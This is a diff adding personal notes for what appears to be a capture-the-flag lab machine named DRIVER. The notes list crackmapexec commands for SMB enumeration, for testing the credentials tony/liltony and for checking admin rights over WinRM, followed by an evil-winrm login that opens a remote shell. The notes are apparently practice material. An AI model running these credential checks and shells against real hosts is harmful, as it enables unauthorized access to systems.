@@ -1,0 +1,16 @@
+::: crackmapexec smb ipTargetHere
+
+SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
+
+
+
+
+
+::: crackmapexec smb ipTargedHere -u 'tony' -p 'liltony'
+
+
+::: crackmapexec winrm iptargedHere -u 'userHEre' -p 'passHere'     /// comprueba si el usuarioEstaOP >:)
+                        [+] .......   (Pwn3d!)
+    {
+      ::: evil-winrm -i ipTargedHere -u 'userHere' -p 'passHere'
+    }
